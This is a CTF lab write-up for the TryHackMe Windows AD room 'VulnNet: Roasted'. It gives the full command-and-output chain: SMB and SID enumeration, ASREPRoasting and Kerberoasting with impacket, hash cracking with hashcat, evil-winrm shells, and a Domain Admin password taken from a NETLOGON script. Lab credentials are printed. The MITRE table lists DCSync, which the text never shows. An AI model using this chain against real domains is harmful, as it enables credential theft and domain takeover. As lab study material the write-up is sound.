# 🔥 VulnNet: Roasted

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/vulnnetroasted)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Windows%20AD-informational?style=for-the-badge&logo=windows)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `vulnnet-rst.local` |
| **OS** | Windows Server 2019 (Active Directory) |
| **Attack Surface** | Anonymous SMB shares → username harvest → ASREPRoast `t-skid` → Kerberoast `enterprise-core-vn` |
| **Privesc** | NETLOGON share leaks `a-whitehat` credentials in VBS script → Domain Admin WinRM → `Administrator` access |

VulnNet: Roasted is a Kerberos-heavy AD box. Anonymous SMB shares expose text files containing staff names. SID brute-forcing via a guest session yields the full user list. `t-skid` has pre-auth disabled — ASREPRoasting gets a crackable hash. Using `t-skid`'s credentials, Kerberoasting yields a TGS hash for `enterprise-core-vn`. That account can access the NETLOGON share, where a VBScript contains hardcoded credentials for `a-whitehat` — a Domain Admin.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 vulnnet-rst.local -oA vulnnet-rst-tcp-scan
```

```
53/tcp   open  domain
88/tcp   open  kerberos-sec
139/tcp  open  netbios-ssn
389/tcp  open  ldap          (Domain: vulnnet-rst.local)
445/tcp  open  microsoft-ds
3268/tcp open  ldap
5985/tcp open  http          WinRM
```

### Anonymous SMB — Username Harvest

```bash
smbclient -L //vulnnet-rst.local -N
# VulnNet-Business-Anonymous (READ)
# VulnNet-Enterprise-Anonymous (READ)

smbclient //vulnnet-rst.local/VulnNet-Business-Anonymous -N
# Business-Manager.txt, Business-Sections.txt, Business-Tracking.txt
```

Staff names extracted from the documents. LDAP and RPC enumeration as guest or anonymous both return `NT_STATUS_ACCESS_DENIED`.

### SID Brute-Force — Full User List

```bash
impacket-lookupsid vulnnet-rst.local/guest@10.10.134.183
```

```
1104: VULNNET-RST\enterprise-core-vn
1105: VULNNET-RST\a-whitehat
1109: VULNNET-RST\t-skid
1110: VULNNET-RST\j-goldenhand
1111: VULNNET-RST\j-leet
```

---

## 💀 Initial Access — ASREPRoast → Kerberoast → WinRM

### ASREPRoast

```bash
impacket-GetNPUsers vulnnet-rst.local/ -usersfile users.txt -no-pass -dc-ip 10.10.134.183
```

```
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:<hash>
```

```bash
hashcat -m 18200 asrep.hash ./rockyou.txt
# t-skid → tj072889*
```

`t-skid` authenticates over SMB but not WinRM.

### Kerberoast — enterprise-core-vn

```bash
impacket-GetUserSPNs vulnnet-rst.local/t-skid -dc-ip 10.10.134.183 -request
# Password: tj072889*
```

```
ServicePrincipalName: CIFS/vulnnet-rst.local
Account: enterprise-core-vn
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$...<hash>
```

```bash
hashcat -m 13100 krb.txt ./rockyou.txt
# enterprise-core-vn → ry=ibfkfv,s6h,
```

```bash
evil-winrm -i vulnnet.local -u enterprise-core-vn -p 'ry=ibfkfv,s6h,'
# *Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents>
```

---

## 🔁 Privilege Escalation — enterprise-core-vn → Domain Admin

### NETLOGON Share — VBScript Credential Leak

```powershell
Get-ChildItem \\localhost\NETLOGON
# ResetPassword.vbs

gc \\localhost\NETLOGON\ResetPassword.vbs
```

```vbscript
strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
```

### a-whitehat is Domain Admin

```bash
net user a-whitehat /domain
# Global Group memberships: *Domain Admins  *Domain Users
```

```bash
evil-winrm -i vulnnet.local -u a-whitehat -p bNdKVkjv3RR9ht
# Full elevated Domain Admin token
```

---

## 🗺️ Attack Chain

```
[Anonymous SMB shares]
    Staff names from text files → username list
    impacket-lookupsid → full AD user enumeration
          │
          ▼
[ASREPRoast — t-skid]
    tj072889* cracked → SMB access
          │
          ▼
[Kerberoast — enterprise-core-vn]
    TGS hash → ry=ibfkfv,s6h, cracked → WinRM access
          │
          ▼
[NETLOGON\ResetPassword.vbs]
    a-whitehat:bNdKVkjv3RR9ht → Domain Admin → WinRM
```

---

## 📌 Key Takeaways

- Anonymous SMB read access to business shares is a direct information leak; even non-credential documents expose org structure and username patterns
- SID brute-forcing via a guest SMB session (`lookupsid`) bypasses LDAP/RPC auth restrictions and reliably enumerates all domain users — restrict guest access entirely
- ASREPRoasting and Kerberoasting require no special privileges once you have valid domain credentials; weak passwords on service accounts and pre-auth-disabled users are high-risk
- Hardcoded credentials in logon scripts stored in NETLOGON are a persistent real-world finding — any script that resets passwords or performs automation should use a secrets manager, not embedded plaintext

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning | [T1595](https://attack.mitre.org/techniques/T1595) |
| Credential Access | Steal or Forge Kerberos Tickets: AS-REP Roasting | [T1558.004](https://attack.mitre.org/techniques/T1558/004) |
| Credential Access | Steal or Forge Kerberos Tickets: Kerberoasting | [T1558.003](https://attack.mitre.org/techniques/T1558/003) |
| Credential Access | OS Credential Dumping: DCSync | [T1003.006](https://attack.mitre.org/techniques/T1003/006) |

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `smbclient` | Anonymous SMB share enumeration, username harvesting |
| `impacket-lookupsid` | SID brute-force for full AD user list |
| `impacket-GetNPUsers` | ASREPRoast t-skid hash |
| `hashcat` | Crack AS-REP and TGS hashes |
| `impacket-GetUserSPNs` | Kerberoast enterprise-core-vn |
| `evil-winrm` | WinRM shell as enterprise-core-vn, then a-whitehat |

## 🚩 Flags

<details>
<summary><code>user.txt</code></summary>

`TBD`

</details>

<details>
<summary><code>root.txt</code></summary>

`TBD`

</details>
